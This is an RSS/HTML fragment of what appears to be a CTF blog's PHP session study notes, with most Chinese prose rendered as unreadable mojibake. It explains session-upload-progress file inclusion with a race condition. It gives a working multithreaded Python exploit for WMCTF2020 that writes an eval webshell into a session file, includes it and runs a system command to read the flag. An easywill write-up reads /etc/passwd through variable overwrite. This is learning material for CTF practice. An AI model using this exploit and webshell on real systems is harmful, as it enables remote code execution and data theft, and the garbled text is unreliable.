&lt;p>æœ€è¿‘åœ¨åˆ·buuojï¼Œæœ‰æœ›è¿™ä¸ªæœˆå†…æŠŠ50è§£ä»¥ä¸Šçš„é¢˜åšå®Œæ&lt;/p>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
ä»¥ä¸‹æ˜¯æœ¬æ–‡ä¸­æ¶‰åŠåˆ°çš„ å’Œæˆ‘å­¦ä¹ æ—¶çœ‹è¿‡çš„æ‰€æœ‰æ–‡ç« çš„é“¾æ¥ğŸ”— æ¯æ—¥æ„Ÿè°¢äº’è”ç½‘çš„ä¸°å¯Œèµ„æºï¼ˆ
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://wiki.php.net/rfc/preload">PHP RFC: Preloading&lt;/a> | &lt;a href="https://wiki.php.net/rfc/ffi">PHP RFC: FFI - Foreign Function Interface&lt;/a> | &lt;a href="https://wiki.php.net/rfc/custom_object_serialization">PHP RFC: New custom object serialization mechanism&lt;/a> | &lt;a href="https://www.laruence.com/2020/03/11/5475.html">PHP FFIè¯¦è§£ - ä¸€ç§å…¨æ–°çš„PHPæ‰©å±•æ–¹å¼&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://towardsdatascience.com/do-you-hate-how-slow-python-is-this-is-how-you-can-make-it-run-faster-532468fe1583">Do You Hate How Slow Python Is? This Is How You Can Make It Run Faster!&lt;/a> | &lt;a href="https://towardsdatascience.com/make-python-faster-with-cffi-python-bindings-eb5402bc35dd">Make Python Faster with CFFI Python Bindings&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://cffi.readthedocs.io/en/latest/">CFFI documentation&lt;/a> | &lt;a href="https://docs.python.org/3/library/ctypes.html">ctypes documentation&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.cnblogs.com/ccxikka/p/9637545.html">Python cffiå­¦ä¹  &lt;/a> | &lt;a href="https://github.com/wolever/python-cffi-example">cffi-example: an example project showing how to use Python&amp;rsquo;s CFFI&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://mochazz.github.io/2019/05/21/RCTF2019Web%E9%A2%98%E8%A7%A3%E4%B9%8Bnextphp/#nextphp">wp&lt;/a> | &lt;a href="http://www.lshhaisheng.com/2021/08/02/%E7%BB%95%E8%BF%87disable_function/">wp2&lt;/a>&lt;/p>
&lt;/details></description></item><item><title>PHP_Sessionå­¦ä¹ ç¬”è®°</title><link>https://amiaaaz.github.io/2021/11/29/php-session-study-notes/</link><pubDate>Mon, 29 Nov 2021 22:23:42 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/29/php-session-study-notes/</guid><description>&lt;p>æåˆ°sessionï¼Œèƒ½æƒ³åˆ°ä»€ä¹ˆæï¼Ÿæ–‡ä»¶ä¸Šä¼ ï¼Œæ¡ä»¶ç«äº‰ï¼ŒsessionåŒ…å«ï¼Œååºåˆ—åŒ–â€¦â€¦ è®©æˆ‘ä»¬ä¸€ç‚¹ç‚¹è¯´&lt;/p>
&lt;hr>
&lt;h2 id="sessioné…ç½®ç®€è¿°">sessioné…ç½®&amp;amp;ç®€è¿°&lt;/h2>
&lt;p>ä»¥7.4.3ä¸ºä¾‹ï¼Œphp.iniä¸­å…³äºSessionæœ‰å‡ ä¸ªé»˜è®¤é¡¹&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;code>session.auto_start = 0&lt;/code>ï¼šé»˜è®¤ä¸å¯åŠ¨sessionï¼Œ*ä½†æ˜¯å¯ä»¥åœ¨phpè„šæœ¬ä¸­æ‰‹åŠ¨æ‰§è¡Œ&lt;code>session_start()&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>session.save_handler = files&lt;/code>ï¼šsessionä»¥æ–‡ä»¶å½¢å¼å­˜å‚¨&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>session.save_path=&amp;quot;&amp;quot;&lt;/code>ï¼šsessionæ–‡ä»¶å­˜å‚¨è·¯å¾„ æ–‡ä»¶åä¸º&lt;code>sess_PHPSESSID&lt;/code>&lt;/p>
&lt;p>linuxä¸‹é»˜è®¤å­˜å‚¨ä½ç½®ï¼›*å¯ä»¥è¢«ä¿®æ”¹&lt;/p>
&lt;pre tabindex="0">&lt;code>/var/lib/php/sess_PHPSESSID
/var/lib/php/sessions/sess_PHPSESSID
/var/lib/php5/sess_PHPSESSID
/var/lib/php5/sessions/sess_PHPSESSID
/tmp/sess_PHPSESSID
/tmp/sessions/sess_PHPSESSID
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>&lt;code>session.serialize_handler = php&lt;/code>ï¼šsessionçš„é»˜è®¤åºåˆ—åŒ–å¼•æ“æ˜¯php&lt;/p>
&lt;p>å…¶å®ä¸€å…±æœ‰3ç§ï¼Œ*phpå’Œphp_serializeè¿™ä¸¤ç§æ˜¯å¾ˆå¤šé¢˜çš„å…ƒå‡¶&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>åºåˆ—åŒ–å¼•æ“&lt;/th>
&lt;th>å­˜å‚¨æ–¹å¼&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>php&lt;/td>
&lt;td>é”®å|åºåˆ—åŒ–åå­—ç¬¦ä¸²&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>php_binary&lt;/td>
&lt;td>é”®åçš„é•¿åº¦å¯¹åº”çš„ ASCII å­—ç¬¦ï¼ˆä¼šæœ‰ä¸å¯æ˜¾ç¤ºçš„å­—ç¬¦ï¼‰+é”®å+ç»è¿‡ serialize() å‡½æ•°ååºåˆ—å¤„ç†çš„å€¼&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>php_serialize(php&amp;gt;=5.5.4)&lt;/td>
&lt;td>å°†å­—ç¬¦ä¸²ååºåˆ—åŒ–å¤„ç†å¾—åˆ°çš„æ•°ç»„&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;/li>
&lt;li>
&lt;p>&lt;code>session.upload_progress.enabled = On&lt;/code>ï¼šå½“æœ‰POSTä¸Šä¼ è¡Œä¸ºæ—¶ï¼Œæ­¤æ¬¡ä¸Šä¼ çš„è¯¦ç»†ä¿¡æ¯ï¼ˆå¦‚ä¸Šä¼ æ—¶é—´ã€ä¸Šä¼ è¿›åº¦ç­‰ï¼‰éƒ½ä¼šè¢«å­˜å‚¨åˆ°sessionä¸­&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>session.upload_progress.cleanup = On&lt;/code>ï¼šå½“POSTä¸Šä¼ å®Œæˆåï¼Œæ­¤æ¬¡çš„sessionæ–‡ä»¶å†…å®¹ä¼šè¢«ç«‹å³æƒ…å†µ&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>session.upload_progress.prefix = &amp;quot;upload_progress_&amp;quot;&lt;/code>ï¼šå­˜å…¥sessionæ–‡ä»¶ä¸­çš„å‰ç¼€éƒ¨åˆ†&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>session.upload_progress.name = &amp;quot;PHP_SESSION_UPLOAD_PROGRESS&amp;quot;&lt;/code>ï¼šé»˜è®¤nameï¼Œ*å¯æ§å¯åˆ©ç”¨&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>session.use_strict_mode = 0&lt;/code>ï¼šè¡¨ç¤ºæˆ‘ä»¬å¯¹Cookieä¸­çš„PHPSESSIDå­—æ®µå¯æ§&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="æ–‡ä»¶åŒ…å«æ¡ä»¶ç«äº‰">æ–‡ä»¶åŒ…å«&amp;amp;æ¡ä»¶ç«äº‰&lt;/h2>
&lt;p>é»˜è®¤æƒ…å†µä¸‹&lt;code>session.use_strict_mode = 0&lt;/code>ï¼Œå½“æˆ‘ä»¬è®¾ç½®äº†Cookieçš„&lt;code>PHPSESSID&lt;/code>å­—æ®µåçš„å€¼valueåï¼Œphpä¼šè‡ªåŠ¨åˆ›å»ºsessionæ–‡ä»¶ï¼ˆé»˜è®¤è·¯å¾„&lt;code>/tmp/sess_PHPSESSID&lt;/code>ï¼‰ï¼›æ³¨æ„è¿™ä¸ªè¡Œä¸ºå¹¶ä¸éœ€è¦&lt;code>session.auto_start = On&lt;/code>æˆ–æ˜¯&lt;code>session_start()&lt;/code>æ¥æ‰‹åŠ¨å¼€å¯å°±ä¼šè¢«PHPè‡ªåŠ¨åˆå§‹åŒ–ä¸€ä¸ªsessionï¼Œå¹¶å°†prefix+valueå†™å…¥sess_PHPSESSIDæ–‡ä»¶ä¸­ï¼›æ•´ä¸ªæµç¨‹ä¸­valueå¯æ§ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠæ¶æ„çš„payloadåŠ è½½åˆ°sessæ–‡ä»¶ä¸­ç„¶ååŒ…å«ï¼Œå¾—åˆ°rce&lt;/p>
&lt;p>è¿™æ˜¯ä¸€ä¸ªå¸¸è§çš„ä¸Šä¼ è¡¨å•&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">form&lt;/span> &lt;span style="color:#75af00">action&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;index.php&amp;#34;&lt;/span> &lt;span style="color:#75af00">method&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;POST&amp;#34;&lt;/span> &lt;span style="color:#75af00">enctype&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;multipart/form-data&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;hidden&amp;#34;&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;PHP_SESSION_UPLOAD_PROGRESS&amp;#34;&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;666666&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;file&amp;#34;&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;file&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;submit&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">form&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å½“ç„¶ä¸€èˆ¬çš„é¢˜ä¸ä¼šæœ‰è¿™ä¹ˆå•çº¯ï¼Œè¿˜ä¼šé…ä¸€ä¸ªé»˜è®¤é¡¹&lt;code>session.upload_progress.cleanup = On&lt;/code>ï¼›ä½†æ˜¯å¦‚æœæˆ‘ä»¬æ„é€ ä¸Šä¼ è¡¨å•æ—¶ä¼ çš„æ— ç”¨æ–‡ä»¶å¾ˆå¤§æ—¶å°±å¯ä»¥æ¥ä¸ªé¡¶çº§æ‹‰æ‰¯ï¼ˆæ¡ä»¶ç«äº‰ï¼‰ï¼Œåœ¨å®ƒè¢«æ¸…ç©ºå‰å…ˆåŒ…å«&amp;amp;rce&lt;/p>
&lt;h3 id="wmctf2020make-php-great-again">[WMCTF2020]Make PHP Great Again&lt;/h3>
&lt;p>å¼€å¹•æºç æš´å‡»&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">require_once&lt;/span> &lt;span style="color:#d88200">&amp;#39;flag.php&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">]))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">require_once&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™ä¸ªé¢˜çš„éé¢„æœŸè§£ï¼šæ–‡ä»¶åŒ…å«+æ¡ä»¶ç«äº‰&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">io&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">threading&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">sessid&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;AMIZ&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;cmd&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;system(&amp;#39;tac /var/www/html/flag.php&amp;#39;);&amp;#34;&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">io&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">BytesIO&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;a&amp;#39;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">100&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">50&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://d5ef2f36-5be3-46d5-8c04-301b9ba4f5f7.node4.buuoj.cn:81/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#39;PHP_SESSION_UPLOAD_PROGRESS&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;?php eval($_POST[&amp;#34;cmd&amp;#34;]);?&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">},&lt;/span> &lt;span style="color:#111">files&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;amiz.txt&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#111">)},&lt;/span> &lt;span style="color:#111">cookies&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#39;PHPSESSID&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">sessid&lt;/span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">resp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://d5ef2f36-5be3-46d5-8c04-301b9ba4f5f7.node4.buuoj.cn:81/?file=/tmp/sess_&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">sessid&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">&amp;#39;amiz.txt&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">resp&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">resp&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">event&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">clear&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">pass&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">event&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">threading&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Event&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">30&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">threading&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Thread&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">target&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">write&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">,))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">start&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">30&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">threading&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Thread&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">target&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">,))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">start&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">event&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">set&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="hxb-2021easywill">[HXB 2021]easywill&lt;/h3>
&lt;p>willphp v2.1.5ï¼Œæ˜¯åŸºäºtpçš„æ¡†æ¶&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">home\controller&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">IndexController&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">assign&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;name&amp;#39;&lt;/span>&lt;span style="color:#111">],&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;value&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">view&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>assign()å¯ä»¥æ§åˆ¶nameå’Œvalueå‚æ•°ï¼Œè€Œç´§è·Ÿç€çš„viewå‡½æ•°æœ‰ç‚¹ä¸œè¥¿&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118101839993.png" alt="image-20211118101839993">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118101952307.png" alt="image-20211118101952307">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118102033617.png" alt="image-20211118102033617">&lt;/p>
&lt;p>å¯ä»¥çœ‹åˆ°æœ€åçš„49è¡Œæœ‰æ–‡ä»¶å†™å…¥çš„ç‚¹ï¼Œ51è¡Œæœ‰ä¸ª&lt;code>extract()&lt;/code>å¯ä»¥åšåˆ°å˜é‡è¦†ç›–ï¼Œé‚£æˆ‘ä»¬å°±æŠŠfile_put_contentsçš„å‚æ•°æ¢æˆè‡ªå·±æƒ³è¦çš„&lt;/p>
&lt;pre tabindex="0">&lt;code>/?name=cfile&amp;amp;value=/etc/passwd
&lt;/code>&lt;/pre>&lt;p>å¯ä»¥æ­£å¸¸å›æ˜¾&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118102448850.png" alt="image-20211118102448850">&lt;/p>
